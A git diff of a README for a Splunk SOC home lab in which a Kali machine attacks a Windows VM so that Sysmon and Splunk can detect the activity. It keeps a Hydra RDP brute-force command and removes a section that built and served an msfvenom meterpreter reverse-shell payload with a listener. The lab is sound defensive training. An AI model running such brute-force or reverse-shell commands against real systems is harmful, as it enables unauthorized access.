@@ -1,3 +1,11 @@
+# SOC Lab: Windows Attack Detection & Security Monitoring with Splunk
+
+## Overview
+
+This lab simulates a real-world security monitoring environment where a **Kali Linux** attacker machine targets a **Windows 2022** victim machine. All logs are forwarded to **Splunk Enterprise** for centralized monitoring, detection, and alerting. The goal is to detect common attack techniques like port scanning (T1046) and RDP brute-forcing (T1110) using Sysmon and Windows Event Logs.
+
+---
+
 ## Technologies Used
 
 | Tool | Purpose |
@@ -158,27 +166,6 @@ apt install hydra
 hydra -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://10.0.2.15
 ```
 
-### 3. Reverse Shell (Metasploit)
-
-```bash
-# Generate payload
-msfvenom -p windows/x64/meterpreter_reverse_tcp \
-  LHOST=10.0.2.10 LPORT=4444 -f exe -o shell.exe
-
-# Serve the file to Windows
-python3 -m http.server 8080
-
-# Set up listener in msfconsole
-use exploit/multi/handler
-set payload windows/x64/meterpreter_reverse_tcp
-set LHOST 10.0.2.10
-set LPORT 4444
-exploit
-```
-
-Execute `shell.exe` on the Windows target and observe Sysmon events in Splunk.
-
----
 ## Splunk Detection Queries
 
 ### Port Scan Detection (T1046)
